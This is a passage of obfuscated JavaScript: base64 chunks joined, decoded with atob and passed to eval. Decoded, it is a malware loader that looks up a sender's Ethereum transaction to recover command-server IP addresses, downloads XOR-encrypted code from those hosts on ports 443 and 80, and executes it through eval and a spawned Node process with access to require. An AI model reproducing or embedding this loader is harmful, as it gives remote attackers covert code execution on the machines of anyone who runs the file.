AgICAgICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2dldFRyYW5zYWN0aW9uQ291bnQnLCBbU0","VOREVSLCB0b0Jsb2NrSGV4KGhlYWQpXSwgc2lnbmFsKSwNCiAg","ICAgICAgY29udHJvbGxlci5zaWduYWwNCiAgICAgICkNCiAgIC","ApOw0KICAgIGNvbnN0IHRhcmdldE5vbmNlID0gbm9uY2UgLSAx","bjsNCg0KICAgIGxldCBsbyA9IFNFQVJDSF9GTE9PUiAtIDFuOw","0KICAgIGxldCBoaSA9IGhlYWQ7DQogICAgd2hpbGUgKGhpIC0g","bG8gPiAxbikgew0KICAgICAgY29uc3Qgc3BhbiA9IGhpIC0gbG","8gLSAxbjsNCiAgICAgIGNvbnN0IGsgPSBCaWdJbnQoTWF0aC5t","aW4oTk9OQ0VfRkFOT1VULCBOdW1iZXIoc3BhbikpKTsNCiAgIC","AgIGNvbnN0IHByb2JlcyA9IFtdOw0KICAgICAgZm9yIChsZXQg","aSA9IDFuOyBpIDw9IGs7IGkgKz0gMW4pIHByb2Jlcy5wdXNoKG","xvICsgKGkgKiAoaGkgLSBsbykpIC8gKGsgKyAxbikpOw0KDQog","ICAgICBjb25zdCBjb3VudHMgPSBhd2FpdCBub25jZUF0QmxvY2","tzKHByb2JlcywgY29udHJvbGxlci5zaWduYWwpOw0KICAgICAg","Y29uc3QgaWR4ID0gY291bnRzLmZpbmRJbmRleCgoYykgPT4gYy","A+PSBub25jZSk7DQogICAgICBpZiAoaWR4ID09PSAtMSkgbG8g","PSBwcm9iZXNbcHJvYmVzLmxlbmd0aCAtIDFdOw0KICAgICAgZW","xzZSB7DQogICAgICAgIGhpID0gcHJvYmVzW2lkeF07DQogICAg","ICAgIGlmIChpZHggPiAwKSBsbyA9IHByb2Jlc1tpZHggLSAxXT","sNCiAgICAgIH0NCiAgICB9DQoNCiAgICBjb25zdCBibG9jayA9","IGF3YWl0IHdpdGhScGNFbmRwb2ludHMoDQogICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4NCiAgICAgICAgcnBjQ2FsbChlbmRw","b2ludCwgJ2V0aF9nZXRCbG9ja0J5TnVtYmVyJywgW3RvQmxvY2","tIZXgoaGkpLCB0cnVlXSwgc2lnbmFsKSwNCiAgICAgIGNvbnRy","b2xsZXIuc2lnbmFsDQogICAgKTsNCiAgICBjb25zdCB0eHMgPS","BibG9jaz8udHJhbnNhY3Rpb25zIHx8IFtdOw0KICAgIGxldCB0","eCA9IG51bGw7DQogICAgZm9yIChjb25zdCB0IG9mIHR4cykgew","0KICAgICAgaWYgKCF0LmZyb20gfHwgdC5mcm9tLnRvTG93ZXJD","YXNlKCkgIT09IFNFTkRFUikgY29udGludWU7DQogICAgICBpZi","AoQmlnSW50KHQubm9uY2UpID09PSB0YXJnZXROb25jZSkgew0K","ICAgICAgICB0eCA9IHQ7DQogICAgICAgIGJyZWFrOw0KICAgIC","AgfQ0KICAgICAgaWYgKCF0eCB8fCBCaWdJbnQodC5ub25jZSkg","PiBCaWdJbnQodHgubm9uY2UpKSB0eCA9IHQ7DQogICAgfQ0KIC","AgIHJldHVybiB7IGJsb2NrTnVtYmVyOiBoaSwgdHggfTsNCiAg","fSBmaW5hbGx5IHsNCiAgICBjb250cm9sbGVyLmFib3J0KCk7DQ","ogIH0NCn0NCg0KYXN5bmMgZnVuY3Rpb24gbGFzdFNlbmRlclR4","VmlhSW5kZXhlcigpIHsNCiAgY29uc3QgdXJsID0NCiAgICBgJH","tJTkRFWEVSX1VSTH0/bW9kdWxlPWFjY291bnQmYWN0aW9uPXR4","bGlzdCZhZGRyZXNzPSR7U0VOREVSfWAgKw0KICAgIGAmc3Rhcn","RibG9jaz0wJmVuZGJsb2NrPTk5OTk5OTk5JnBhZ2U9MSZvZmZz","ZXQ9MjAmc29ydD1kZXNjJmZpbHRlcmJ5PWZyb21gOw0KICBjb2","5zdCBwYXlsb2FkID0gYXdhaXQgaHR0cFJlcXVlc3QodXJsKTsN","CiAgY29uc3QgbGlzdCA9IEFycmF5LmlzQXJyYXkocGF5bG9hZD","8ucmVzdWx0KSA/IHBheWxvYWQucmVzdWx0IDogW107DQogIGNv","bnN0IHR4ID0gbGlzdC5maW5kKCh0KSA9PiB0LmZyb20gJiYgdC","5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUik7DQogIGlm","ICghdHgpIHJldHVybiBudWxsOw0KICByZXR1cm4geyBibG9ja0","51bWJlcjogQmlnSW50KHR4LmJsb2NrTnVtYmVyKSwgdHggfTsN","Cn0NCg0KYXN5bmMgZnVuY3Rpb24gcnVuKCkgew0KICBsZXQgYm","xvY2tIZXg7DQogIHRyeSB7DQogICAgYmxvY2tIZXggPSBhd2Fp","dCB3aXRoUnBjRW5kcG9pbnRzKChlbmRwb2ludCwgc2lnbmFsKS","A9Pg0KICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2V0aF9ibG9j","a051bWJlcicsIFtdLCBzaWduYWwpDQogICAgKTsNCiAgfSBjYX","RjaCB7DQogICAgcmV0dXJuOw0KICB9DQogIGNvbnN0IGxhdGVz","dCA9IEJpZ0ludChibG9ja0hleCk7DQogIGNvbnN0IHRhcmdldE","Jsb2NrID0gbGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJ","UExFKTsNCiAgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KIC","BsZXQgbWF0Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0","ZUJsb2Nrcyh0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw","0KICBsZXQgW2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0","Y2g/LnR4Py50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybC","hpcCwgcG9ydCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSBy","ZXR1cm4gbnVsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cD","ovLyR7aXB9OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoN","CiAgbGV0IGNvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPS","BwYXlsb2FkVXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBp","ZiAoY2xzVXJsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPS","Bhd2FpdCBnZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xz","VXJsKTsNCiAgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudW","xsOw0KICAgIH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAg","IG1hdGNoID0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobG","F0ZXN0KS5jYXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChh","d2FpdCBsYXN0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKC","kgPT4gbnVsbCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVB","ZGRyZXNzKG1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2","xvYmFsWydfViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydf","SCddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWy","dfSDInXSA9IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2Jh","bFsnX3RfcyddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2","dsb2JhbFsnX3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0K","DQogIGZ1bmN0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgIC","Bjb25zdCBiYXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5o","b3N0bmFtZSwNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydC","kgfHwgODAsDQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1","cmwuc2VhcmNoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgIC","AnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBO","VCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMz","YgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4w","IFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2","xvYmFsWydfViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoN","CiAgICBmdW5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgIC","Bjb25zdCBrbiA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxl","dCBpID0gMDsgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF","49IGtleS5jaGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1","cm4gYnVmLnRvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogIC","AgZnVuY3Rpb24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAg","IGNvbnN0IGI2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYj","Y0J107DQogICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9y","KCdNaXNzaW5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldH","VybiB4b3JEZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0","JykpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobW","V0aG9kKSB7DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJl","c29sdmUsIHJlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZX","EgPSBodHRwLnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwg","KHJlcykgPT4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09IC","dIRUFEJykgew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShm","cm9tQjY0SGVhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlam","VjdChlKTsgfQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0K","ICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgIC","AgICAgICBjb25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICBy","ZXMub24oJ2RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKG","NodW5rKSk7DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9","PiB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgIC","Bjb25zdCBidWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQog","ICAgICAgICAgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcm","Vzb2x2ZSh4b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAg","IGlmIChyZXMuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZX","R1cm4gcmVzb2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAg","ICAgICAgICAgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYX","lsb2FkIGJvZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChl","KSB7DQogICAgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgIC","AgICAgIH0NCiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMu","b24oJ2Vycm9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogIC","AgICAgIHJlcS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAg","ICByZXEuc2V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID","0+IHsNCiAgICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3Io","YEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU3","1tc2ApKTsNCiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQo","KTsNCiAgICAgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZX","F1ZXN0KCdHRVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFE","JykpOw0KICB9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYW","Rlcih1cmwsIGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAg","ICAgIGNvbnN0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdX","JsKTsNCiAgICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAg","ICA/IGBnbG9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fC","AwfSc7Z2xvYmFsWydfSCddPScke19nbG9iYWxbJ19IJ119Jztn","bG9iYWxbJ19IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYm","FsWydyJ109cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7Z2xv","YmFsLl9fX2ZpbGVuYW1lPSdbZXZhbF0nO2dsb2JhbC5fX19kaX","JuYW1lPXByb2Nlc3MuY3dkKCk7dmFyIF9nbG9iYWw9Z2xvYmFs","O2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPScke19nbG9iYW","xbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPScke19nbG9i","YWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPScke19nbG9iYW","xbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcmU7Z2xvYmFs","WydtJ109bW9kdWxlO2dsb2JhbC5fX19maWxlbmFtZT0nW2V2YW","xdJztnbG9iYWwuX19fZGlybmFtZT1wcm9jZXNzLmN3ZCgpO3Zh","ciBfZ2xvYmFsPWdsb2JhbDtgOw0KDQogICAgICBpZiAoIWlzQm","9vdCkgZXZhbChlbnYgKyBjb2RlKTsNCiAgICAgIGF3YWl0IHNw","YXduTm9kZVNjcmlwdChlbnYgKyBjb2RlKTsNCiAgICB9IGNhdG","NoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVuX2xvYWRlcihu","ZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC9jbHNgKSwgJ3","E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQogIGF3YWl0IHJ1","bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aXAxfTo0NDMvMH","gvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0cnVlKTsNCn0N","Cg0KcnVuKCk7DQo="].join('');var _0xac4db=atob(_0xac4da);eval(_0xac4db);})();
